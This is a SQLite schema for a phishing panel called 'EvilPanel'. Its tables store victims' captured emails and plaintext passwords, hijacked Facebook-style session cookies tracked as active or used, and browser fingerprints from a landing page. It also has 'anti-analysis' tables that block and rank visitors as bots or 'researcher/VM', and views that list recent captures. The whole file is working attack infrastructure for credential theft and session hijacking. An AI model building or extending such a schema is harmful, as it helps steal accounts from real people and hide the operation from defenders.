-- EvilPanel Database Schema v3.0
-- SQLite database for credential and session storage
-- Based on 2025 implementation plan

-- Enable foreign keys
PRAGMA foreign_keys = ON;

-- Credentials table
CREATE TABLE IF NOT EXISTS credentials (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT NOT NULL,
    password TEXT NOT NULL,
    ip_address TEXT,
    user_agent TEXT,
    fingerprint_id TEXT,
    request_path TEXT,
    captured_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX IF NOT EXISTS idx_credentials_email ON credentials(email);
CREATE INDEX IF NOT EXISTS idx_credentials_captured ON credentials(captured_at);

-- Sessions table
CREATE TABLE IF NOT EXISTS sessions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    c_user TEXT,
    xs TEXT,
    fr TEXT,
    datr TEXT,
    sb TEXT,
    wd TEXT,
    presence TEXT,
    ip_address TEXT,
    credential_id INTEGER,
    all_cookies TEXT,
    status TEXT DEFAULT 'active',  -- active, used, expired
    captured_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    
    FOREIGN KEY (credential_id) REFERENCES credentials(id)
);

CREATE INDEX IF NOT EXISTS idx_sessions_c_user ON sessions(c_user);
CREATE INDEX IF NOT EXISTS idx_sessions_status ON sessions(status);
CREATE INDEX IF NOT EXISTS idx_sessions_captured ON sessions(captured_at);

-- Fingerprints table (from landing page)
CREATE TABLE IF NOT EXISTS fingerprints (
    id TEXT PRIMARY KEY,
    ip_address TEXT,
    user_agent TEXT,
    screen_resolution TEXT,
    timezone TEXT,
    language TEXT,
    platform TEXT,
    webgl_vendor TEXT,
    webgl_renderer TEXT,
    canvas_hash TEXT,
    raw_data TEXT,
    captured_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX IF NOT EXISTS idx_fingerprints_ip ON fingerprints(ip_address);

-- Request logs (debugging)
CREATE TABLE IF NOT EXISTS request_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    method TEXT,
    path TEXT,
    content_type TEXT,
    has_credentials INTEGER DEFAULT 0,
    response_code INTEGER,
    captured_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Blocked IPs (anti-analysis)
CREATE TABLE IF NOT EXISTS blocked_ips (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip_address TEXT UNIQUE NOT NULL,
    reason TEXT,
    blocked_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Blocked Requests (detailed bot detection logging)
CREATE TABLE IF NOT EXISTS blocked_requests (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip_address TEXT NOT NULL,
    user_agent TEXT,
    reason TEXT NOT NULL,
    threat_level INTEGER DEFAULT 1,  -- 0=clean, 1=bot, 2=researcher/VM
    path TEXT,
    blocked_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX IF NOT EXISTS idx_blocked_ip ON blocked_requests(ip_address);
CREATE INDEX IF NOT EXISTS idx_blocked_threat ON blocked_requests(threat_level);
CREATE INDEX IF NOT EXISTS idx_blocked_at ON blocked_requests(blocked_at);

-- Views for easy querying
CREATE VIEW IF NOT EXISTS v_full_captures AS
SELECT 
    c.id,
    c.email,
    c.password,
    c.ip_address,
    c.user_agent,
    c.captured_at,
    s.c_user,
    s.xs,
    s.fr,
    s.status as session_status,
    s.captured_at as session_captured_at
FROM credentials c
LEFT JOIN sessions s ON s.credential_id = c.id
ORDER BY c.captured_at DESC;

-- Recent captures view (last 24 hours)
CREATE VIEW IF NOT EXISTS v_recent_captures AS
SELECT * FROM v_full_captures
WHERE captured_at >= datetime('now', '-24 hours');
